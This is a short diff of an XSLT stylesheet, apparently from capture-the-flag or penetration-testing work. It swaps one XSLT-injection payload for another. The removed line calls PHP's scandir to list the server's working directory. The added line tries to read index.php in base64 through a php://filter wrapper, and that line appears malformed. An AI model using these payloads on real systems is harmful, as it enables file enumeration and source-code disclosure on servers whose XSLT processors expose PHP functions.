@@ -3,7 +3,7 @@
 
 
    
-   <xsl:value-of select="php:function('implode',',',scandir(getcwd()))"/>
+   <xsl:value-of select="php:php://filter/read=convert.base64-encode/resource=index.php"/>
    
    </xsl:template>
 </xsl:stylesheet>
